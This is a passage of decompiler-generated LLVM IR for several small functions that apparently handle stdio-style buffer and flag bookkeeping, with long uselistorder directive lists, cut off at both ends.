dec_label_pc_8056a6d:                             ; preds = %dec_label_pc_8056a30, %dec_label_pc_8056a69
  %v0_8056a70 = phi i32 [ -1, %dec_label_pc_8056a30 ], [ %v2_8056a6b, %dec_label_pc_8056a69 ]
  ret i32 %v0_8056a70

; uselistorder directives
  uselistorder i8 %v4_8056a5e, { 1, 0 }
  uselistorder i32 %v2_8056a5b, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 2, { 95, 15, 17, 96, 97, 0, 40, 98, 16, 53, 100, 101, 19, 23, 22, 99, 102, 103, 104, 64, 105, 106, 107, 108, 109, 110, 66, 24, 67, 68, 31, 111, 112, 25, 54, 32, 26, 27, 113, 76, 33, 28, 77, 49, 114, 115, 116, 117, 65, 119, 120, 37, 78, 79, 50, 1, 41, 42, 121, 38, 63, 55, 2, 3, 4, 5, 118, 6, 7, 51, 8, 122, 123, 125, 126, 29, 43, 93, 94, 86, 87, 34, 35, 36, 9, 124, 44, 80, 81, 39, 10, 11, 82, 20, 12, 83, 13, 45, 84, 85, 88, 92, 52, 69, 70, 71, 56, 57, 72, 18, 73, 30, 74, 46, 21, 75, 58, 59, 47, 89, 48, 90, 14, 91, 60, 61, 62 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056a6d, { 1, 0 }
  uselistorder label %dec_label_pc_8056a69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056a4d, { 1, 0 }
}

define i32 @function_8056a74(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8056a74:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8056a74 = load i32, i32* @ebx, align 4
  store i32 %v0_8056a74, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8056a7a = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056a7a, i32* @ebx, align 4
  %v1_8056a82 = bitcast i16* %arg1 to i8*
  %v2_8056a82 = load i8, i8* %v1_8056a82, align 1
  %v3_8056a82 = and i8 %v2_8056a82, 4
  %v4_8056a82 = icmp eq i8 %v3_8056a82, 0
  %v1_8056a85 = icmp eq i1 %v4_8056a82, false
  br i1 %v1_8056a85, label %dec_label_pc_8056ab4, label %dec_label_pc_8056a87

dec_label_pc_8056a87:                             ; preds = %dec_label_pc_8056a74
  %v2_8056a87 = icmp slt i32 %arg3, 0
  %v1_8056a89 = icmp eq i1 %v2_8056a87, false
  br i1 %v1_8056a89, label %dec_label_pc_8056a90, label %dec_label_pc_8056a8b

dec_label_pc_8056a8b:                             ; preds = %dec_label_pc_8056a87
  br label %dec_label_pc_8056a90

dec_label_pc_8056a90:                             ; preds = %dec_label_pc_8056a87, %dec_label_pc_8056a8b
  %v0_8056a91 = phi i32 [ %arg3, %dec_label_pc_8056a87 ], [ 2147483647, %dec_label_pc_8056a8b ]
  %v1_8056a96 = add i32 %v4_8056a7a, 4
  %v2_8056a96 = inttoptr i32 %v1_8056a96 to i32*
  %v3_8056a96 = load i32, i32* %v2_8056a96, align 4
  %v3_8056a99 = inttoptr i32 %arg2 to i32*
  %v4_8056a99 = call i32 @function_80503b8(i32 %v3_8056a96, i32* %v3_8056a99, i32 %v0_8056a91)
  store i32 %v4_8056a99, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_8056a99, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8056ab4, label %dec_label_pc_8056aa6

dec_label_pc_8056aa6:                             ; preds = %dec_label_pc_8056a90
  %v1_8056aa1 = icmp eq i32 %v4_8056a99, 0
  %v4_8056aa4 = icmp eq i1 %v1_8056aa1, false
  %v0_8056aae = load i32, i32* @ebx, align 4
  %v1_8056aae = inttoptr i32 %v0_8056aae to i16*
  %v2_8056aae = load i16, i16* %v1_8056aae, align 2
  br i1 %v4_8056aa4, label %dec_label_pc_8056aae, label %dec_label_pc_8056aa8

dec_label_pc_8056aa8:                             ; preds = %dec_label_pc_8056aa6
  %v3_8056aa8 = or i16 %v2_8056aae, 4
  store i16 %v3_8056aa8, i16* %v1_8056aae, align 2
  %v0_8056ab7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056ab4

dec_label_pc_8056aae:                             ; preds = %dec_label_pc_8056aa6
  %v3_8056aae = or i16 %v2_8056aae, 8
  store i16 %v3_8056aae, i16* %v1_8056aae, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056ab4

dec_label_pc_8056ab4:                             ; preds = %dec_label_pc_8056a90, %dec_label_pc_8056a74, %dec_label_pc_8056aa8, %dec_label_pc_8056aae
  %v0_8056ab7 = phi i32 [ %v4_8056a99, %dec_label_pc_8056a90 ], [ 0, %dec_label_pc_8056a74 ], [ %v0_8056ab7.pre, %dec_label_pc_8056aa8 ], [ 0, %dec_label_pc_8056aae ]
  %v2_8056ab6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056ab6, i32* @ebx, align 4
  ret i32 %v0_8056ab7

; uselistorder directives
  uselistorder i16 %v2_8056aae, { 1, 0 }
  uselistorder i32 %v4_8056a99, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @function_80503b8, { 1, 0 }
  uselistorder i32 4, { 194, 195, 196, 197, 204, 205, 206, 200, 198, 199, 201, 202, 203, 25, 1, 207, 208, 209, 210, 211, 212, 213, 214, 215, 32, 80, 81, 82, 33, 34, 35, 216, 55, 26, 83, 2, 3, 138, 139, 140, 217, 4, 218, 60, 219, 141, 142, 143, 5, 220, 221, 222, 223, 224, 225, 226, 227, 65, 228, 229, 230, 231, 69, 36, 232, 233, 234, 235, 37, 38, 39, 70, 40, 41, 42, 43, 236, 44, 237, 71, 45, 72, 73, 6, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 61, 154, 263, 155, 264, 265, 271, 272, 0, 274, 275, 276, 266, 56, 77, 267, 268, 269, 270, 7, 84, 85, 86, 87, 88, 74, 115, 116, 117, 66, 131, 132, 133, 134, 89, 90, 91, 92, 93, 67, 8, 94, 95, 277, 279, 282, 291, 292, 293, 294, 295, 9, 283, 284, 285, 286, 287, 288, 289, 290, 280, 281, 238, 59, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 23, 259, 260, 262, 261, 10, 96, 278, 296, 297, 57, 298, 299, 300, 301, 27, 11, 28, 177, 68, 273, 12, 156, 13, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 46, 47, 78, 29, 174, 175, 176, 97, 98, 54, 99, 100, 53, 101, 102, 103, 51, 52, 104, 75, 105, 48, 106, 49, 50, 107, 108, 109, 110, 111, 112, 113, 114, 118, 119, 120, 22, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 30, 135, 24, 14, 136, 15, 62, 63, 76, 137, 64, 178, 179, 16, 31, 17, 18, 180, 19, 181, 182, 183, 184, 185, 186, 187, 188, 20, 21, 189, 190, 191, 192, 193, 58, 79 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i8 0, { 146, 38, 5, 8, 9, 39, 7, 6, 147, 148, 149, 150, 11, 156, 151, 152, 10, 154, 155, 153, 34, 157, 2, 3, 54, 56, 158, 159, 36, 161, 12, 14, 58, 57, 13, 40, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 87, 88, 172, 173, 17, 179, 175, 176, 174, 15, 177, 178, 16, 35, 180, 181, 182, 183, 184, 185, 186, 194, 195, 19, 60, 59, 18, 61, 62, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 143, 102, 103, 196, 104, 197, 199, 200, 201, 202, 203, 187, 188, 189, 190, 191, 192, 41, 193, 125, 21, 144, 145, 20, 105, 106, 52, 1, 30, 31, 32, 29, 0, 42, 43, 44, 107, 204, 128, 160, 108, 109, 110, 111, 112, 113, 114, 22, 115, 116, 23, 117, 118, 119, 120, 121, 122, 123, 124, 63, 198, 55, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 37, 81, 82, 83, 84, 85, 86, 126, 127, 129, 130, 131, 24, 132, 133, 33, 134, 25, 135, 136, 138, 137, 26, 139, 140, 28, 141, 27, 142, 53, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i8 4, { 4, 1, 0, 5, 6, 3, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056ab4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8056a90, { 1, 0 }
}

define i32 @function_8056ab8(i32 %arg1) local_unnamed_addr {
dec_label_pc_8056ab8:
  %edx.global-to-local = alloca i32, align 4
  %v0_8056ab8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056ac0 = add i32 %arg1, 8
  %v2_8056ac0 = inttoptr i32 %v1_8056ac0 to i32*
  %v3_8056ac0 = load i32, i32* %v2_8056ac0, align 4
  store i32 %v3_8056ac0, i32* %edx.global-to-local, align 4
  %v1_8056ac3 = add i32 %arg1, 12
  %v2_8056ac3 = inttoptr i32 %v1_8056ac3 to i32*
  %v3_8056ac3 = load i32, i32* %v2_8056ac3, align 4
  %v2_8056ac6 = sub i32 %v3_8056ac3, %v3_8056ac0
  %v3_8056acb = inttoptr i32 %arg1 to i16*
  %v4_8056acb = call i32 @function_8056a74(i16* %v3_8056acb, i32 %v3_8056ac0, i32 %v2_8056ac6)
  %v0_8056ad0 = load i32, i32* @ebx, align 4
  %v1_8056ad0 = add i32 %v0_8056ad0, 8
  %v2_8056ad0 = inttoptr i32 %v1_8056ad0 to i32*
  %v3_8056ad0 = load i32, i32* %v2_8056ad0, align 4
  store i32 %v3_8056ad0, i32* %edx.global-to-local, align 4
  %v2_8056ad3 = add i32 %v0_8056ad0, 16
  %v3_8056ad3 = inttoptr i32 %v2_8056ad3 to i32*
  store i32 %v3_8056ad0, i32* %v3_8056ad3, align 4
  %v0_8056ad6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056ad6 = add i32 %v0_8056ad6, %v4_8056acb
  store i32 %v2_8056ad6, i32* %edx.global-to-local, align 4
  %v1_8056ad8 = load i32, i32* @ebx, align 4
  %v2_8056ad8 = add i32 %v1_8056ad8, 20
  %v3_8056ad8 = inttoptr i32 %v2_8056ad8 to i32*
  store i32 %v2_8056ad6, i32* %v3_8056ad8, align 4
  store i32 %v0_8056ab8, i32* @ebx, align 4
  ret i32 %v4_8056acb

; uselistorder directives
  uselistorder i32 %v4_8056acb, { 1, 0 }
  uselistorder i32 20, { 26, 27, 28, 29, 30, 31, 32, 5, 16, 33, 7, 34, 6, 24, 25, 4, 11, 12, 14, 13, 17, 18, 19, 0, 20, 1, 21, 8, 22, 23, 35, 9, 3, 15, 10, 2 }
  uselistorder i32 16, { 72, 73, 74, 75, 76, 78, 77, 6, 79, 80, 23, 2, 81, 24, 82, 83, 84, 3, 41, 42, 85, 86, 87, 88, 89, 90, 97, 91, 92, 93, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 43, 44, 63, 64, 45, 46, 47, 48, 110, 25, 26, 31, 32, 35, 33, 115, 108, 8, 7, 109, 0, 9, 116, 117, 27, 114, 49, 50, 51, 52, 53, 54, 1, 55, 56, 57, 58, 59, 10, 60, 61, 30, 62, 111, 112, 113, 21, 22, 19, 20, 17, 18, 12, 13, 14, 15, 16, 34, 36, 5, 37, 38, 39, 40, 11, 28, 65, 4, 66, 67, 68, 69, 70, 71, 29, 118 }
  uselistorder i32 12, { 49, 50, 51, 52, 53, 0, 54, 18, 23, 55, 56, 57, 20, 19, 5, 58, 6, 7, 8, 9, 10, 11, 12, 34, 35, 36, 37, 38, 39, 40, 41, 42, 48, 43, 76, 22, 24, 27, 33, 25, 26, 86, 87, 88, 89, 90, 91, 92, 78, 79, 80, 81, 82, 83, 84, 85, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 21, 75, 93, 94, 95, 96, 77, 44, 1, 2, 45, 46, 13, 14, 47, 3, 17, 16, 15, 28, 29, 30, 31, 32, 4, 97 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @function_8056ae0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056ae0:
  %v0_8056ae0 = load i32, i32* @ebx, align 4
  %v4_8056ae4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056ae4, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8056aec = bitcast i16* %arg1 to i32*
  %v2_8056aec = load i32, i32* %v1_8056aec, align 4
  %v1_8056aee = urem i32 %v2_8056aec, 65536
  %v2_8056af1 = and i32 %v1_8056aee, %arg2
  %v3_8056af1 = icmp eq i32 %v2_8056af1, 0
  %v1_8056af3 = icmp eq i1 %v3_8056af1, false
  br i1 %v1_8056af3, label %dec_label_pc_8056b02, label %dec_label_pc_8056af5

dec_label_pc_8056af5:                             ; preds = %dec_label_pc_8056ae0
  %v1_8056af5 = and i32 %v2_8056aec, 2176
  %v2_8056af5 = icmp eq i32 %v1_8056af5, 0
  %v1_8056afb = icmp eq i1 %v2_8056af5, false
  br i1 %v1_8056afb, label %dec_label_pc_8056b09, label %dec_label_pc_8056afd

dec_label_pc_8056afd:                             ; preds = %dec_label_pc_8056af5
  %v2_8056afd = or i32 %v2_8056aec, %arg2
  %v1_8056aff = trunc i32 %v2_8056afd to i16
  store i16 %v1_8056aff, i16* %arg1, align 2
  %v0_8056b02.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056b02

dec_label_pc_8056b02:                             ; preds = %dec_label_pc_8056ae0, %dec_label_pc_8056afd
  %v0_8056b24 = phi i32 [ %v4_8056ae4, %dec_label_pc_8056ae0 ], [ %v0_8056b02.pre, %dec_label_pc_8056afd ]
  %v1_8056b02 = inttoptr i32 %v0_8056b24 to i16*
  %v2_8056b02 = load i16, i16* %v1_8056b02, align 2
  %v2_8056b05 = and i16 %v2_8056b02, 16
  %v3_8056b05 = icmp eq i16 %v2_8056b05, 0
  br i1 %v3_8056b05, label %dec_label_pc_8056b1d, label %dec_label_pc_8056b09

dec_label_pc_8056b09:                             ; preds = %dec_label_pc_8056b02, %dec_label_pc_8056af5
  %v1_8056b09 = call i32 @function_8050568(i32 %v0_8056ae0)
  %v1_8056b0e = inttoptr i32 %v1_8056b09 to i32*
  store i32 9, i32* %v1_8056b0e, align 4
  br label %dec_label_pc_8056b14

dec_label_pc_8056b14:                             ; preds = %dec_label_pc_8056b21, %dec_label_pc_8056b09
  %v0_8056b14 = load i32, i32* @ebx, align 4
  %v1_8056b14 = inttoptr i32 %v0_8056b14 to i16*
  %v2_8056b14 = load i16, i16* %v1_8056b14, align 2
  %v3_8056b14 = or i16 %v2_8056b14, 8
  store i16 %v3_8056b14, i16* %v1_8056b14, align 2
  br label %dec_label_pc_8056b41

dec_label_pc_8056b1d:                             ; preds = %dec_label_pc_8056b02
  %v2_8056b1d = and i16 %v2_8056b02, 64
  %v3_8056b1d = icmp eq i16 %v2_8056b1d, 0
  br i1 %v3_8056b1d, label %dec_label_pc_8056b3b, label %dec_label_pc_8056b21

dec_label_pc_8056b21:                             ; preds = %dec_label_pc_8056b1d
  %v2_8056b25 = call i32 @function_8050744(i32 %v0_8056b24)
  %v1_8056b2d = icmp eq i32 %v2_8056b25, 0
  %v1_8056b2f = icmp eq i1 %v1_8056b2d, false
  br i1 %v1_8056b2f, label %dec_label_pc_8056b14, label %dec_label_pc_8056b31

dec_label_pc_8056b31:                             ; preds = %dec_label_pc_8056b21
  %v0_8056b31 = load i32, i32* @ebx, align 4
  %v1_8056b31 = inttoptr i32 %v0_8056b31 to i16*
  %v2_8056b31 = load i16, i16* %v1_8056b31, align 2
  %v3_8056b31 = and i16 %v2_8056b31, -65
  store i16 %v3_8056b31, i16* %v1_8056b31, align 2
  %v0_8056b35 = load i32, i32* @ebx, align 4
  %v1_8056b35 = add i32 %v0_8056b35, 8
  %v2_8056b35 = inttoptr i32 %v1_8056b35 to i32*
  %v3_8056b35 = load i32, i32* %v2_8056b35, align 4
  %v2_8056b38 = add i32 %v0_8056b35, 28
  %v3_8056b38 = inttoptr i32 %v2_8056b38 to i32*
  store i32 %v3_8056b35, i32* %v3_8056b38, align 4
  %v0_8056b3b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056b3b

dec_label_pc_8056b3b:                             ; preds = %dec_label_pc_8056b1d, %dec_label_pc_8056b31
  %v9_8056b3b = phi i32 [ %v0_8056b24, %dec_label_pc_8056b1d ], [ %v0_8056b3b.pre, %dec_label_pc_8056b31 ]
  %v1_8056b3b = inttoptr i32 %v9_8056b3b to i16*
  %v2_8056b3b = load i16, i16* %v1_8056b3b, align 2
  %v3_8056b3b = or i16 %v2_8056b3b, 1
  store i16 %v3_8056b3b, i16* %v1_8056b3b, align 2
  br label %dec_label_pc_8056b41

dec_label_pc_8056b41:                             ; preds = %dec_label_pc_8056b14, %dec_label_pc_8056b3b
  %storemerge = phi i32 [ 0, %dec_label_pc_8056b3b ], [ -1, %dec_label_pc_8056b14 ]
  store i32 %v0_8056ae0, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8056aec, { 1, 2, 0 }
  uselistorder i32 %v0_8056ae0, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 28, { 26, 27, 28, 15, 16, 29, 30, 31, 17, 32, 40, 33, 34, 2, 35, 36, 37, 38, 39, 4, 5, 6, 0, 25, 14, 18, 19, 20, 21, 22, 23, 1, 24, 41, 11, 10, 8, 9, 12, 13, 7, 3 }
  uselistorder i32 8, { 91, 92, 93, 94, 96, 95, 97, 11, 12, 98, 99, 100, 101, 102, 103, 0, 104, 13, 9, 105, 106, 107, 108, 109, 110, 40, 62, 111, 42, 19, 20, 21, 22, 43, 23, 24, 25, 44, 26, 45, 27, 46, 47, 63, 64, 65, 66, 67, 68, 41, 69, 89, 70, 141, 142, 37, 147, 38, 148, 39, 51, 53, 56, 61, 54, 55, 160, 161, 162, 163, 164, 165, 166, 1, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 2, 112, 113, 114, 115, 116, 49, 3, 50, 4, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 48, 134, 135, 5, 136, 137, 138, 139, 6, 140, 167, 168, 14, 146, 15, 16, 52, 71, 72, 73, 74, 76, 77, 78, 75, 79, 80, 81, 82, 28, 29, 83, 84, 85, 86, 87, 88, 17, 143, 144, 145, 149, 36, 35, 33, 34, 30, 31, 32, 10, 57, 58, 59, 60, 18, 8, 7, 90 }
  uselistorder i32 (i32)* @function_8050744, { 3, 2, 1, 6, 5, 4, 0 }
  uselistorder i16 8, { 3, 4, 0, 2, 5, 1 }
  uselistorder i32 9, { 15, 16, 17, 18, 19, 4, 8, 13, 3, 6, 5, 9, 10, 11, 12, 0, 7, 2, 1, 14 }
  uselistorder i32 (i32)* @function_8050568, { 36, 48, 34, 59, 58, 57, 33, 32, 31, 47, 46, 30, 29, 23, 41, 45, 40, 17, 16, 15, 14, 2, 56, 1, 13, 21, 12, 5, 55, 54, 53, 20, 19, 39, 0, 44, 43, 42, 6, 18, 51, 4, 3, 37, 35, 26, 11, 28, 7, 25, 27, 8, 50, 24, 22, 10, 9, 52, 49, 38 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 2, 3, 4 }
  uselistorder i32 65536, { 0, 1, 2, 4, 5, 3, 6, 40, 7, 8, 9, 10, 12, 11, 14, 13, 16, 15, 18, 17, 19, 20, 41, 43, 21, 23, 22, 24, 25, 28, 29, 30, 26, 31, 27, 33, 32, 34, 36, 35, 37, 39, 38, 42 }
  uselistorder i32* @ecx, { 110, 26, 5, 7, 25, 6, 111, 112, 113, 114, 115, 116, 14, 117, 118, 119, 120, 15, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 34, 35, 36, 37, 38, 39, 137, 8, 9, 40, 0, 138, 139, 50, 11, 18, 140, 141, 16, 10, 17, 142, 143, 144, 145, 146, 147, 169, 170, 171, 172, 1, 41, 51, 52, 31, 53, 109, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 27, 79, 80, 81, 108, 82, 83, 28, 84, 24, 30, 178, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 19, 196, 181, 182, 183, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 20, 163, 164, 166, 167, 168, 165, 180, 207, 208, 209, 210, 211, 212, 213, 148, 32, 33, 85, 86, 87, 88, 89, 90, 91, 29, 12, 92, 13, 93, 94, 95, 96, 97, 21, 22, 2, 3, 98, 99, 23, 100, 101, 102, 103, 104, 106, 107, 42, 43, 105, 173, 179, 174, 177, 175, 176, 44, 45, 46, 47, 48, 49, 4, 214 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056b41, { 1, 0 }
  uselistorder label %dec_label_pc_8056b3b, { 1, 0 }
  uselistorder label %dec_label_pc_8056b02, { 1, 0 }
}

define i32 @function_8056b50() local_unnamed_addr {
dec_label_pc_8056b50:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8056b5c = load i32, i32* @global_var_805d000.374, align 4096
  %v10_8056b61 = icmp eq i32 %v0_8056b5c, -1
  br i1 %v10_8056b61, label %dec_label_pc_8056b72, label %dec_label_pc_8056b66.preheader

dec_label_pc_8056b66.preheader:                   ; preds = %dec_label_pc_8056b50
  br label %dec_label_pc_8056b66

dec_label_pc_8056b66:                             ; preds = %dec_label_pc_8056b66.preheader, %dec_label_pc_8056b66
  %v4_8056b69 = phi i32 [ %v0_8056b5c, %dec_label_pc_8056b66.preheader ], [ %v2_8056b6b, %dec_label_pc_8056b66 ]
  %v0_8056b66 = phi i32 [ ptrtoint (i32* @global_var_805d000.374 to i32), %dec_label_pc_8056b66.preheader ], [ %v1_8056b66, %dec_label_pc_8056b66 ]
  %v1_8056b66 = add i32 %v0_8056b66, -4
  call void @__pseudo_call(i32 %v4_8056b69)
  %v1_8056b6b = inttoptr i32 %v1_8056b66 to i32*
  %v2_8056b6b = load i32, i32* %v1_8056b6b, align 4
  %v10_8056b6d = icmp eq i32 %v2_8056b6b, -1
  %v1_8056b70 = icmp eq i1 %v10_8056b6d, false
  br i1 %v1_8056b70, label %dec_label_pc_8056b66, label %dec_label_pc_8056b72.loopexit

dec_label_pc_8056b72.loopexit:                    ; preds = %dec_label_pc_8056b66
  %v2_8056b72.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8056b72

dec_label_pc_8056b72:                             ; preds = %dec_label_pc_8056b72.loopexit, %dec_label_pc_8056b50
  %v2_8056b72 = phi i32 [ %v2_8056b72.pre, %dec_label_pc_8056b72.loopexit ], [ %tmp6, %dec_label_pc_8056b50 ]
  ret i32 %v2_8056b72

; uselistorder directives
  uselistorder i32 %v0_8056b5c, { 1, 0 }
  uselistorder i1 false, { 547, 548, 549, 550, 551, 36, 552, 553, 554, 1, 0, 3, 555, 557, 556, 2, 559, 558, 560, 561, 562, 563, 37, 5, 38, 571, 566, 570, 568, 569, 52, 564, 565, 567, 4, 572, 573, 574, 575, 66, 69, 70, 71, 72, 68, 73, 74, 75, 76, 77, 78, 576, 577, 583, 39, 578, 579, 581, 580, 584, 585, 590, 589, 586, 587, 588, 6, 7, 79, 80, 81, 53, 591, 592, 593, 596, 594, 595, 8, 40, 597, 599, 598, 54, 600, 602, 601, 55, 603, 604, 605, 606, 607, 608, 609, 377, 378, 379, 380, 381, 382, 610, 611, 612, 41, 10, 613, 614, 615, 616, 618, 617, 9, 619, 620, 42, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 649, 650, 652, 651, 11, 82, 83, 84, 85, 383, 384, 385, 653, 478, 485, 386, 387, 388, 389, 390, 391, 392, 64, 393, 394, 395, 396, 397, 398, 538, 539, 540, 541, 399, 400, 401, 402, 403, 404, 405, 406, 479, 480, 481, 482, 483, 484, 407, 408, 654, 655, 50, 409, 56, 410, 411, 412, 656, 657, 658, 659, 666, 667, 668, 669, 670, 673, 57, 674, 675, 672, 665, 660, 86, 661, 662, 108, 12, 109, 110, 115, 87, 676, 677, 678, 679, 680, 681, 682, 690, 691, 692, 693, 694, 695, 684, 685, 686, 687, 688, 689, 683, 633, 634, 635, 636, 637, 638, 639, 640, 33, 642, 641, 646, 643, 644, 645, 13, 647, 648, 509, 696, 697, 699, 700, 486, 671, 15, 545, 544, 14, 413, 414, 415, 58, 493, 494, 495, 496, 498, 497, 16, 499, 416, 17, 698, 500, 582, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 18, 435, 436, 438, 437, 19, 439, 440, 441, 442, 443, 445, 34, 446, 444, 447, 449, 448, 20, 450, 451, 453, 452, 59, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 88, 89, 663, 60, 664, 21, 67, 512, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 111, 112, 113, 23, 114, 22, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 43, 364, 365, 366, 367, 368, 51, 369, 370, 371, 372, 373, 374, 375, 376, 487, 488, 63, 489, 44, 490, 45, 491, 492, 24, 503, 501, 502, 25, 504, 26, 505, 506, 507, 27, 508, 35, 510, 511, 513, 514, 46, 515, 516, 517, 518, 527, 519, 520, 521, 522, 523, 524, 525, 526, 28, 528, 61, 529, 530, 531, 47, 32, 532, 31, 48, 30, 533, 534, 29, 535, 536, 537, 49, 542, 543, 546, 701, 702, 703, 65, 62, 704 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 37, 38, 39, 40, 50, 52, 53, 54, 2, 51, 0, 49, 43, 44, 45, 46, 47, 48, 4, 55, 41, 42, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 5, 1, 35, 36 }
  uselistorder i32 ptrtoint (i32* @global_var_805d000.374 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, {}
  uselistorder i32 1, { 370, 152, 247, 371, 61, 730, 216, 202, 203, 731, 212, 732, 38, 733, 248, 734, 735, 9, 736, 737, 286, 738, 363, 180, 373, 372, 101, 204, 249, 250, 739, 218, 740, 349, 741, 742, 743, 217, 744, 231, 364, 100, 99, 745, 746, 375, 374, 177, 747, 376, 748, 377, 176, 749, 750, 378, 168, 169, 594, 595, 596, 597, 598, 599, 600, 601, 602, 383, 382, 381, 380, 379, 68, 67, 66, 69, 603, 604, 605, 386, 385, 384, 153, 155, 154, 156, 158, 157, 287, 751, 752, 205, 285, 753, 754, 251, 755, 313, 756, 758, 387, 98, 0, 1, 762, 759, 760, 761, 219, 388, 20, 19, 763, 389, 22, 606, 607, 608, 252, 609, 764, 765, 766, 390, 174, 173, 170, 171, 172, 315, 767, 768, 769, 770, 253, 116, 318, 319, 320, 771, 391, 321, 322, 772, 254, 2, 393, 392, 179, 323, 394, 102, 324, 200, 325, 773, 774, 775, 776, 777, 778, 779, 780, 245, 781, 398, 397, 396, 395, 104, 105, 255, 256, 143, 144, 142, 145, 288, 232, 400, 399, 118, 119, 326, 782, 783, 327, 328, 784, 402, 401, 403, 175, 404, 21, 329, 405, 206, 785, 786, 214, 787, 257, 220, 221, 788, 789, 213, 790, 791, 792, 